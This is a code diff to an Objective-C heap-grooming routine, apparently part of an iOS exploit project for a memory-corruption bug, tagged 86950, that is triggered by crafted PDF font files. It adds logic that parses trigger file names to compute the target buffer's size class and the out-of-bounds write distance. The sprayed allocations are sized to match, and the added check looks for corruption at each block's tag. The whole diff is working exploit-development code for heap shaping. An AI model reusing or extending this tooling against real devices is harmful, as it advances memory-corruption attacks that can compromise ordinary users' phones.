@@ -2,6 +2,7 @@
 #import <UIKit/UIKit.h>
 #import <ImageIO/ImageIO.h>
 #import <CoreGraphics/CoreGraphics.h>
+#import <math.h>
 #import "Modules.h"
 #import "AppDelegate.h"
 #import "Util.h"
@@ -67,8 +68,25 @@ static int ModGroomScan(int regions, size_t each, NSString *pdfName, int maxPx) 
     // spray a ladder of size classes: the freelist corruption was observed for
     // ~1.8 KB and ~3.7 KB allocations, so cover 128 B .. 8 KB and put `regions`
     // blocks in each class.  Plain C arrays, no NSValue boxing.
-    size_t szs[] = { 128, 256, 512, 1024, 2048, 3744, 4096, 8192 };
+    //
+    // Geometry (EXPLOIT-86950-PLAN.md + gen_leaf.py): the OOB write lands
+    // 4*(width_px+16) bytes BEFORE the coverage buffer, and for the
+    // lf_dxNN_LLLLLL family width_px = leaf * (32767/16384)^9 * 1024/16384
+    // (Tf=1024, upm=16384, N=9 composite levels).  lf_dx33_000500 is therefore
+    // ~16k px wide: a ~64 KB buffer and a ~64 KB write distance -- 8x beyond
+    // the biggest fixed class, which is why the ladder alone can never be hit.
+    // The calibrated trigger's own class and its distance are appended.
+    size_t szs[] = { 128, 256, 512, 1024, 2048, 3744, 4096, 8192, 0, 0 };
     int nsz = (int)(sizeof(szs) / sizeof(szs[0]));
+    int dx = 0, leaf = 0;
+    if (sscanf(pdfName.UTF8String, "lf_dx%2d_%6d", &dx, &leaf) == 2 && leaf > 0) {
+        double w = (double)leaf * pow(32767.0 / 16384.0, 9.0) * 1024.0 / 16384.0;
+        szs[nsz - 2] = (size_t)(4.0 * w);            // the coverage buffer's class
+        szs[nsz - 1] = (size_t)(4.0 * (w + 16.0));   // the documented write distance
+        AvePost([NSString stringWithFormat:@"86950 groom geometry: dx=%d leaf=%d "
+                 @"width_px=%.0f buf=%zu B dist=%zu B (the write aims that far "
+                 @"before the buffer)", dx, leaf, w, szs[nsz - 2], szs[nsz - 1]]);
+    }
     int cap = regions * nsz;
     void **ptrs = (void **)calloc((size_t)cap, sizeof(void *));
     size_t *szl = (size_t *)calloc((size_t)cap, sizeof(size_t));
@@ -96,8 +114,12 @@ static int ModGroomScan(int regions, size_t each, NSString *pdfName, int maxPx) 
         void *p = ptrs[i];
         size_t sz = szl[i];
         uint64_t *q = (uint64_t *)p;
-        for (size_t off = 8; off + 8 <= sz; off += 8) {   // skip our own tag slot
-            if (q[off / 8] != 0xA5A5A5A5A5A5A5A5ULL) {
+        // word 0 holds this block's unique tag, and that is exactly where a
+        // distance-matched write lands, so compare it against the tag we wrote
+        uint64_t want0 = MARK ^ (uint64_t)(0x10000 * (i / regions) + (i % regions));
+        for (size_t off = 0; off + 8 <= sz; off += 8) {
+            uint64_t want = (off == 0) ? want0 : 0xA5A5A5A5A5A5A5A5ULL;
+            if (q[off / 8] != want) {
                 AvePost([NSString stringWithFormat:@"86950 CORRUPTION block %d (+%zu) "
                          @"@+%#zx = %#llx", i, sz, off, q[off / 8]]);
                 corrupt++;
